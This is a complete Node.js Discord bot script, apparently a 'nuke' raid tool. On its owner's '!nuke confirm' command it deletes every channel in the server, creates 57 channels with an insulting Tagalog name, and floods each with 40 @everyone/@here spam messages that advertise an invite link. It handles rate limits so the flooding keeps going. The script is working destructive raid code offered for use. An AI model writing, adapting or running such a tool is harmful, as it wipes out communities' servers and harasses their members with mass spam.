const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
const fs = require('fs');

// ---- LOAD TOKEN (foolproof) ----
let TOKEN = process.env.TOKEN;
let OWNER_ID = process.env.OWNER_ID;

if (!TOKEN || !OWNER_ID) {
  try {
    const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
    TOKEN = config.TOKEN;
    OWNER_ID = config.OWNER_ID;
    console.log("✅ Loaded from config.json");
  } catch (e) {
    console.error("❌ NO TOKEN OR OWNER_ID in env or config.json");
    process.exit(1);
  }
}

// Debug: show token length (never print full token)
console.log(`🔑 Token loaded, length: ${TOKEN.length}`);
if (TOKEN.length < 50) console.error("⚠️ Token looks too short – check if you copied the full token");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

const prefix = '!';
const ownerId = OWNER_ID;
const spamMsg = `@everyone @here Lipad server mga kumag! https://discord.gg/qWD57gU7S __script__ . ~~boost~~ ||@everyone|| ||@here||`;

function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

async function deleteAllChannels(guild) {
  let channels = guild.channels.cache;
  console.log(`🗑️ Deleting ${channels.size} channels...`);
  for (let chan of channels.values()) {
    try { await chan.delete(); await sleep(400); } catch(e) { console.log(`Failed: ${chan.name} – ${e.message}`); }
  }
}

async function create57Channels(guild) {
  let created = [];
  for (let i = 1; i <= 57; i++) {
    let name = `lipad-server-mga-kumag-${i}`;
    try {
      let channel = await guild.channels.create({
        name: name,
        type: ChannelType.GuildText,
        permissionOverwrites: [{ id: guild.roles.everyone.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }]
      });
      created.push(channel);
      console.log(`📝 Created #${name}`);
      await sleep(350);
    } catch(err) {
      if (err.code === 429) { await sleep(err.retryAfter * 1000); i--; }
      else console.log(`❌ Create fail ${name}: ${err.message}`);
    }
  }
  return created;
}

async function floodChannel(channel, count = 40) {
  for (let i = 0; i < count; i++) {
    try { await channel.send(spamMsg); await sleep(200); }
    catch(err) {
      if (err.code === 429) { await sleep(err.retryAfter * 1000); i--; }
      else console.log(`❌ Msg fail in #${channel.name}: ${err.message}`);
    }
  }
  console.log(`📢 Sent 40 messages in #${channel.name}`);
}

async function nukeGuild(guild) {
  console.log(`🔥 NUKING ${guild.name}`);
  await deleteAllChannels(guild);
  let channels = await create57Channels(guild);
  for (let ch of channels) await floodChannel(ch, 40);
  console.log("💀 NUKE COMPLETE");
}

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (msg) => {
  if (msg.author.bot || !msg.content.startsWith(prefix)) return;
  const args = msg.content.slice(prefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();
  if (cmd === 'nuke' && msg.author.id === ownerId) {
    if (args[0] !== 'confirm') return msg.reply("⚠️ Type `!nuke confirm` to proceed.");
    await msg.reply("💣 Nuking...");
    await nukeGuild(msg.guild);
  }
});

client.login(TOKEN).catch(err => {
  console.error("❌ Login failed:", err.message);
  if (err.message.includes("token")) console.error("➡️ Your token is invalid. Reset it on Discord Developer Portal.");
}); 
